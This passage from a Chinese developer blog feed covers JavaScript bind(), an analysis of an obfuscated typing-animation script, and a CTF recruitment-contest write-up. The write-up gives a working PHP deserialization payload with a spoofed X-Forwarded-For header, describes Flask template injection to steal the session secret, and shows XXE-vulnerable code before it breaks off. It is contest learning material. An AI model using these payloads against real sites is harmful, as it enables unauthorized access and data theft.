class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这段代码因为没有具体上下文所以可能显得有些刻意，不过足够说明问题本身了</span></span><br><span class="line"><span class="keyword">let</span> runTime = <span class="keyword">new</span> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.data = <span class="number">0</span></span><br><span class="line">  <span class="keyword">this</span>.addData = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">'#btn-addData'</span>);</span><br><span class="line">btn.onclick = runTime.addData;</span><br></pre></td></tr></table></figure><p>这里试图在点击一个按钮后将 runTime.data 自增，在将回调函数绑定到 click 事件时使用了 <code>btn.onclick = runTime.addData</code> 这样的语句，然而需要注意的是，在绑定后，addData 中的 this 就不再是 runTime ，而是 btn 了，这样在点击后就会尝试递增 btn.data ，从而偏离了本意。</p><p>正确的做法和前面的例子一样，应该在 addData 的函数定义后加入 <code>.bind(this)</code> 语句，从而将 this 强制绑定为 runTime 对象。</p><h1 id="0x3-第三个场景"><a href="#0x3-第三个场景" class="headerlink" title="0x3 第三个场景"></a>0x3 第三个场景</h1><p>另外上面给出的 MDN 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/b" target="_blank" rel="noopener">链接</a>中也有几个场景，不过我认为其中受用面最大的应该是 “快捷调用” 的场景，这里为了查阅方便来转述一下</p><p>场景的意图在于给经常调用的长对象方法提供一个捷径，比如想通过 Array.prototype.slice 来将一个类数组对象转换为真正的数组时，常规写法可能是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="built_in">Array</span>.prototype.slice</span><br><span class="line">...</span><br><span class="line">slice.apply(<span class="built_in">arguments</span>)</span><br></pre></td></tr></table></figure><p>但是当这个函数需要经常被调用时，slice.apply 的写法还是有些令人厌烦，这时可以利用 bind 来将 apply 的 this 绑定为 Array.prototype.slice（这个 this 指的是 “apply 作为谁的方法被调用” 中的 “谁” 而不是 apply 的第一个参数），从而通过直接调用绑定后的函数（包装函数）来达到目的，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="built_in">Function</span>.prototype.apply.bind(<span class="built_in">Array</span>.prototype.slice)</span><br><span class="line">...</span><br><span class="line">slice(<span class="built_in">arguments</span>)</span><br></pre></td></tr></table></figure><p>这样就缩短了调用方法时所需的长前缀，写起来就能更愉快一些。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一段 Js 代码的解读与思考</title>
      <link href="/2019/12/11/JS-Inspection/"/>
      <url>/2019/12/11/JS-Inspection/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>最近逛别人博客的时候，偶然看到了下面这货：</p><blockquote><div id="yuren-content"></div></blockquote><p>立刻就被这个简约的小东西给吸引住了，于是对着它就是一发审查元素，想看看其具体的实现，在把主要的部分提取出来后得到如下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"binft"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> binft=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> d=<span class="built_in">document</span>.createDocumentFragment(),c=<span class="number">0</span>;a&gt;c;c++)&#123;<span class="keyword">var</span> b=<span class="built_in">document</span>.createElement(<span class="string">"span"</span>);b.textContent=<span class="built_in">String</span>.fromCharCode(<span class="number">94</span>*<span class="built_in">Math</span>.random()+<span class="number">33</span>);b.style.color=f[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*f.length)];d.appendChild(b)&#125;<span class="keyword">return</span> d&#125;<span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> d=h[a.skillI];a.step?a.step--:(a.step=k,a.prefixP&lt;b.length?(<span class="number">0</span>&lt;=a.prefixP&amp;&amp;(a.text+=b[a.prefixP]),a.prefixP++):<span class="string">"forward"</span>===a.direction?a.skillP&lt;d.length?(a.text+=d[a.skillP],a.skillP++):a.delay?a.delay--:(a.direction=<span class="string">"backward"</span>,</span></span><br><span class="line"><span class="javascript">a.delay=l):<span class="number">0</span>&lt;a.skillP?(a.text=a.text.slice(<span class="number">0</span>,<span class="number">-1</span>),a.skillP--):(a.skillI=(a.skillI+<span class="number">1</span>)%h.length,a.direction=<span class="string">"forward"</span>));e.textContent=a.text;e.appendChild(m(a.prefixP&lt;b.length?<span class="built_in">Math</span>.min(c,c+a.prefixP):<span class="built_in">Math</span>.min(c,d.length-a.skillP)));setTimeout(g,n)&#125;<span class="keyword">var</span> b=<span class="string">""</span>,h=<span class="string">"\u9752\u9752\u9675\u4e0a\u67cf\uff0c\u78ca\u78ca\u6da7\u4e2d\u77f3\u3002 \u4eba\u751f\u5929\u5730\u95f4\uff0c\u5ffd\u5982\u8fdc\u884c\u5ba2\u3002 \u6597\u9152\u76f8\u5a31\u4e50\uff0c\u804a\u539a\u4e0d\u4e3a\u8584\u3002 \u9a71\u8f66\u7b56\u9a7d\u9a6c\uff0c\u6e38\u620f\u5b9b\u4e0e\u6d1b\u3002 \u6d1b\u4e2d\u4f55\u90c1\u90c1\uff0c\u51a0\u5e26\u81ea\u76f8\u7d22\u3002 \u957f\u8862\u7f57\u5939\u5df7\uff0c\u738b\u4faf\u591a\u7b2c\u5b85\u3002 \u4e24\u5bab\u9065\u76f8\u671b\uff0c\u53cc\u9619\u767e\u4f59\u5c3a\u3002 \u6781\u5bb4\u5a31\u5fc3\u610f\uff0c\u621a\u621a\u4f55\u6240\u8feb\uff1f"</span>.split(<span class="string">" "</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">return</span> a+</span></span><br><span class="line"><span class="javascript"><span class="string">""</span>&#125;),l=<span class="number">2</span>,k=<span class="number">1</span>,c=<span class="number">5</span>,n=<span class="number">75</span>,f=<span class="string">"rgb(110,64,170) rgb(150,61,179) rgb(191,60,175) rgb(228,65,157) rgb(254,75,131) rgb(255,94,99) rgb(255,120,71) rgb(251,150,51) rgb(226,183,47) rgb(198,214,60) rgb(175,240,91) rgb(127,246,88) rgb(82,246,103) rgb(48,239,130) rgb(29,223,163) rgb(26,199,194) rgb(35,171,216) rgb(54,140,225) rgb(76,110,219) rgb(96,84,200)"</span>.split(<span class="string">" "</span>),a=&#123;<span class="attr">text</span>:<span class="string">""</span>,<span class="attr">prefixP</span>:-c,<span class="attr">skillI</span>:<span class="number">0</span>,<span class="attr">skillP</span>:<span class="number">0</span>,<span class="attr">direction</span>:<span class="string">"forward"</span>,<span class="attr">delay</span>:l,<span class="attr">step</span>:k&#125;;g()&#125;;binft(<span class="built_in">document</span>.getElementById(<span class="string">'binft'</span>));</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 js 的部分经历了压缩，随便找了个在线解压工具尝试格式化后，终于获得了一份勉强能看的代码。而由于最近刚刚了解了 js 混淆的含义与作用，这份代码又刚好经过了不太难的混淆处理，故准备拿它开刀，尝试自己分析一下。</p><h1 id="0x1-相关问题"><a href="#0x1-相关问题" class="headerlink" title="0x1 相关问题"></a>0x1 相关问题</h1><h2 id="0x10-恼人的条件表达式"><a href="#0x10-恼人的条件表达式" class="headerlink" title="0x10 恼人的条件表达式"></a>0x10 恼人的条件表达式</h2><p>首先比较麻烦的就是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.step ? a.step--:(a.step = k, a.prefixP &lt; b.length ? (<span class="number">0</span> &lt;= a.prefixP &amp;&amp; (a.text += b[a.prefixP]), a.prefixP++) : <span class="string">"forward"</span> === a.direction ? a.skillP &lt; d.length ? (a.text += d[a.skillP], a.skillP++) : a.delay ? a.delay--:(a.direction = <span class="string">"backward"</span>, a.delay = l) : <span class="number">0</span> &lt; a.skillP ? (a.text = a.text.slice(<span class="number">0</span>, <span class="number">-1</span>), a.skillP--) : (a.skillI = (a.skillI + <span class="number">1</span>) % h.length, a.direction = <span class="string">"forward"</span>))</span><br></pre></td></tr></table></figure><p>这一坨迷之表达式了，对我而言非常有必要将其转换成普通的 if-else 语句，于是尝试 STFW 后得到如下三只：</p><ul><li><a href="https://opengg.github.io/babel-plugin-transform-ternary-to-if-else/" target="_blank" rel="noopener">OpenGG 的 转换工具(会转成 IIFE)</a></li><li><a href="https://raybb.github.io/ternary-converter/" target="_blank" rel="noopener">raybb 的 转换工具(需要用空格分隔关键字)</a></li><li><a href="converter.website-dev.eu">website-dev.eu 的转换工具(需要科学上网，或手动换源)</a></li></ul><p>然而如上所述，三位前辈的工具都有着各自的问题，先抛开 IIFE 的可读性不说，后面两只并没有支持诸如  <code>1?(2?3:4,3?4:5):6</code> 这样的平行语句，因此并不能处理上面的表达式，考虑到未来可能还会有类似的需求，故以解决上述情况为主要目标，掏出 Python 一顿乱敲产出了如下脚本（TL;DR）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引号中输入想要处理的内容</span></span><br><span class="line">tmp = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预处理 删除所有空格 方便后面判断左右是否有括号</span></span><br><span class="line">tmp = tmp.replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line"><span class="comment"># 将一组语句在考虑括号的前提下以逗号再分组</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSplitContent</span><span class="params">(tmp)</span>:</span></span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line">indexs = []</span><br><span class="line">words = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line"><span class="keyword">if</span> tmp[i] == <span class="string">'('</span>:</span><br><span class="line">balance += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i] == <span class="string">')'</span>:</span><br><span class="line">balance -= <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i]==<span class="string">','</span> <span class="keyword">and</span> balance==<span class="number">0</span>:</span><br><span class="line">indexs.append(i)</span><br><span class="line"><span class="comment"># 手动切分 因为 str 是不可变对象 暂时没有好办法</span></span><br><span class="line">i = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> indexs:</span><br><span class="line">words.append(tmp[i+<span class="number">1</span>:j])</span><br><span class="line">i = j</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">words.append(tmp[i+<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 tmp 中和 ? 匹配的 : 符号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIndex</span><span class="params">(tmp)</span>:</span></span><br><span class="line">balance = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tmp)):</span><br><span class="line"><span class="keyword">if</span> tmp[i] == <span class="string">'?'</span>:</span><br><span class="line">balance += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> tmp[i] == <span class="string">':'</span>:</span><br><span class="line">balance -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> balance == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">(input, n=<span class="number">0</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> input.startswith(<span class="string">'('</span>) <span class="keyword">and</span> input.endswith(<span class="string">')'</span>):</span><br><span class="line">input = input[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">tab = <span class="string">'  '</span>*n</span><br><span class="line">splitTmp = getSplitContent(input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tmp <span class="keyword">in</span> splitTmp:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 没找到则说明当前语句不可再分</span></span><br><span class="line">left = tmp.find(<span class="string">'?'</span>)</span><br><span class="line"><span class="keyword">if</span> left == <span class="number">-1</span>:</span><br><span class="line">print(<span class="string">"%s%s;"</span>%(tab, tmp))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 没找到则说明条件表达式不完整</span></span><br><span class="line">right = getIndex(tmp)</span><br><span class="line"><span class="keyword">if</span> right == <span class="number">-1</span>:</span><br><span class="line">print(<span class="string">"Error"</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># 打印当前层的 if-else 语句并递归处理子句</span></span><br><span class="line">print(<span class="string">"%sif (%s) &#123;"</span>%(tab, tmp[:left]))</span><br><span class="line"></span><br><span class="line">fun(tmp[left+<span class="number">1</span>:right], n+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'%s&#125; else &#123;'</span>%tab)</span><br><span class="line"></span><br><span class="line">fun(tmp[right+<span class="number">1</span>:], n+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'%s&#125;'</span>%tab)</span><br><span class="line"></span><br><span class="line">fun(tmp)</span><br></pre></td></tr></table></figure><p>主要思路比较简单，就是以括号为基准挑选出可作为分隔符的逗号，并以此对语句进行分组后再递归处理，唯一比较坑的地方是 python 中 str 属于不可变对象，因此这里只好采用记录下标并手动拆分的办法= =</p><p>同时，受上面前辈的启发，觉得可以在博客里开个 <a href="/tools/">杂项</a> 的板块，里面放一些小脚本等与博客本身没什么关系的东西，这样既方便日后的使用，也可以作为一种练习，嗯，可喜可贺。</p><p>把上面的一坨表达式丢进脚本里，再用运行后的结果替换之，可以发现这个名为 <strong>g</strong> 的函数就是逻辑的主要部分了。</p><h2 id="0x11-setTimeout-以及-js-事件循环机制"><a href="#0x11-setTimeout-以及-js-事件循环机制" class="headerlink" title="0x11 setTimeout 以及 js 事件循环机制"></a>0x11 setTimeout 以及 js 事件循环机制</h2><p>结束替换的工作后，就可以开始读代码了。考虑到实际的效果，能够猜到代码里包含着类似循环的部分，可是尝试搜索 for 和 while 时都没有找到任何内容。在仔细阅读后，终于发现在上面转换出来的 g 函数里静静地躺着一只 <code>setTimeout(g, n)</code> ，想来它就是我们的目标了。</p><p>可是很奇怪，之前在 w某school 和 某鸟 中了解到该函数只是设置一个表达式在多少毫秒后执行（因为没有实际用过我一直以为是像 sleep 一样的东西），那么如果把它放在这个地方，为什么不会因为无限递归而爆栈呢？</p><p>继续 STFW 后，终于得到<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">答案</a>，这里为了方便日后回忆以及防止链接挂掉，简单地总结一下：</p><ul><li><p>首先要明确的，是 js 本身是一个 <strong>单线程</strong> 的语言，但是为了更好地处理网页中日渐庞大的静态资源，其提供了 同步任务 和 异步任务 两种机制。在实际执行时，同步任务进入主线程，而异步任务进入 EventTable 并注册回调函数，在指定的事情完成后，EventTable 会将这个函数移入 EventQueue；当 js 的 monitoring process 进程发现主线程空栈后就会去 EventQueue 中读取对应的函数并执行，这个过程一直持续到所有的任务被完成。</p></li><li><p>而除了广义的 同步 与 异步，在精细定义下任务还可以被分成 宏任务(macro-task) 和 微任务(micro-task) ，前者包括整体代码，setTimeout，setInterval，后者包括 Promise，process.nextTick 等等；不同的任务在执行时会以这两种任务为基准进入对应的 EventQueue ，并交替运行直至所有任务被完成。</p></li><li><p>而 setTimeout 函数中用来表示时间的参数，实际上指的是经过多少毫秒后将任务从 EventTable 转移到宏任务的 EventQueue 中，所以影响实际时间的因素其实还挺多的，完全不是 w某school 和 某鸟 中说的那样= =</p></li></ul><p>据说这一点在前端的面试题中屡见不鲜，以后有时间可以找一找相关的内容。</p><p>回到正题，由于这里把函数调用放到了所有语句的最后，所以时间上基本没什么偏差；而之所以以这种方式实现，是因为 js 本事是单线程的语言，所以如果这里以普通循环来实现的话会让其他的任务卡住，看来 <strong>这里异步的递归就是循环</strong> 呀，嗯，学到了。</p><h2 id="0x12-createDocumentFragment-的含义"><a href="#0x12-createDocumentFragment-的含义" class="headerlink" title="0x12 createDocumentFragment 的含义"></a>0x12 createDocumentFragment 的含义</h2><p>从最终效果来看，这是一个不断更新文档元素的过程，通过查看代码可以发现，实际负责插入随机字符的是名为 m 的这个函数，注意到在其 for 循环中，有着名为 createDocumentFragment 的函数调用，这就又触及到我的盲区了，遂继续<a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/createDocumentFragment" target="_blank" rel="noopener">求助网络</a>，得知该函数可以很好地工作在频繁更新元素的环境下。</p><h1 id="0x2-结语"><a href="#0x2-结语" class="headerlink" title="0x2 结语"></a>0x2 结语</h1><p>做好上述准备后，就可以安心地读代码了。其本身并没有什么难度，在去掉了用来混淆的无关代码以及对变量和函数进行语义化后就得到了当前页面中使用的 js 代码了。有兴趣的朋友们可以看一下～</p><script>// 作为 web 坑的新人，非常渴望找到一个可以交流技术或可以一起合作写项目的个人或// 团体，如果您对此有兴趣的话，非常欢迎通过右侧的联系方式与我交流～    (()=>{        let div = document.querySelector('#yuren-content');        let sequences = ["一二三四五，上山打老虎。", "老虎没打到，打到小松鼠。"];        let colors = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"];        function getOneColor() {            return colors[Math.floor(Math.random()*colors.length)];        }        function getSomeChar(r) {            let n=document.createDocumentFragment();            for (let i=0; i<r; ++i) {                let l = document.createElement('span');                l.textContent = String.fromCharCode(33+94*Math.random());                l.style.color = getOneColor();                n.appendChild(l);            }            return n;        }        let tmp = "";        let index = 0;        let which = 0;        let delay = 2;        let stop = true;        let direction = "forward";        function run() {            let seq = sequences[which];            if (stop) {                stop = false;            } else {                stop = true;                if (direction === "forward") {                    if (index < seq.length) {                        tmp += seq[index];                        ++index;                    } else {                        if (delay) {                            --delay;                        } else {                            direction = 'backward';                            delay = 2;                        }                    }                } else {                    if (index > 0) {                        tmp = tmp.slice(0, -1);                        --index;                    } else {                        which = (which+1)%sequences.length;                        direction = 'forward';                    }                }            }            div.textContent = tmp;            div.appendChild(getSomeChar(Math.min(5, seq.length-index)));            setTimeout(run, 75);        }        run();    })();</script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NEXCTF 招新赛 WirteUP</title>
      <link href="/2019/11/20/NEXCTF-WriteUp/"/>
      <url>/2019/11/20/NEXCTF-WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>本文是上个月学校 NEX 战队招新赛中部分题目的 WriteUP ，因为赛事从结果上来说还是很令人高兴的，所以一直都想单独写一篇博客来记录这些题目，但是因为学校的一堆事情+拖延症的问题，差不多过了1个月才着手做这件事…</p><h1 id="0x1-相关环境"><a href="#0x1-相关环境" class="headerlink" title="0x1 相关环境"></a>0x1 相关环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python v3.7.4</span><br><span class="line">requests v2.22.0</span><br><span class="line">Flask v1.1.1</span><br><span class="line">Binwalk v2.1.1</span><br><span class="line">dd</span><br></pre></td></tr></table></figure><h1 id="0x2-各WriteUP"><a href="#0x2-各WriteUP" class="headerlink" title="0x2 各WriteUP"></a>0x2 各WriteUP</h1><h2 id="0x20-Web-签到"><a href="#0x20-Web-签到" class="headerlink" title="0x20 Web 签到"></a>0x20 Web 签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'get'</span>] === <span class="string">'1'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'post'</span>] === <span class="string">'1'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>] === <span class="string">'127.0.0.1'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           unserialize($_POST[<span class="string">'class'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码如上，分析知 ttt 类的析构函数会输出 flag 内容，而代码中存在 <a href="https://www.php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize</a> 函数，故可知该代码存在<a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/" target="_blank" rel="noopener">反序列化漏洞</a>。下面来构造 ttt 类的序列化内容，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ttt</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ttt);</span><br></pre></td></tr></table></figure><p>那么现在解决问题的关键就是构造满足三个 if 条件的请求，以使程序流程到达反序列化函数那里。get 和 post 都是常规的请求，这里可以了解一下 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For" target="_blank" rel="noopener">X-Forwarded-For</a> ，然后可通过 Python3+Requests 构造如下请求来获取  flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'requests'</span>).post(<span class="string">'http://&lt;ip&gt;:&lt;port&gt;/?get=1'</span>, data=&#123;<span class="string">'post'</span>:<span class="string">'1'</span>,<span class="string">'class'</span>:<span class="string">'O:3:"ttt":0:&#123;&#125;'</span>&#125;, headers=&#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">'127.0.0.1'</span>&#125;).content</span><br></pre></td></tr></table></figure><h2 id="0x21-Baby-Flask"><a href="#0x21-Baby-Flask" class="headerlink" title="0x21 Baby Flask"></a>0x21 Baby Flask</h2><p><a href="https://pan.baidu.com/s/1uAlyfJY63h05kG9LmGQQTg" target="_blank" rel="noopener">源码</a> 提取码: upiv</p><p>可以看到，路由 /admin 可以获取到 Flag ，该视图函数通过验证 session 中 admin 的值来返还不同的内容；而因为 Flask 是<a href="https://www.secpulse.com/archives/97707.html" target="_blank" rel="noopener">客户端session</a>的模式，故这个值可以人为修改。</p><p>那么解题的目标就变成了通过寻找注入点来获取 secretkey ，查看代码知调用 render_template_string 函数时第一个参数传递了 template.replace，将 模版中的 $remembered_name 替换成了 session 中 name 的值，通过查看 index.html 可知该占位符出现在 Info 模块和 Author 输入框的 value 属性中，故可通过合理控制 Author 中的值来实现注入。</p><p>而在 app.py 中，通过定义 safe_input 函数针对 post 过来的输入进行了过滤，查看代码可知输入中不能出现 ()[]_ 这几种字符，所以可以通过全局变量 config 来获取secretkey。</p><p>拿到key以后，通过构造 session ，并使用浏览器自带的开发者工具将原来的值替换掉即可通过访问 /admin 拿到 Flag。</p><h2 id="0x22-Baby-xxe"><a href="#0x22-Baby-xxe" class="headerlink" title="0x22 Baby xxe"></a>0x22 Baby xxe</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = $_POST[<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($xmlfile)) &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (stristr($xmlfile, <span class="string">"xml"</span>)) &#123;</span><br><span class="line">$xmlfile = str_ireplace(<span 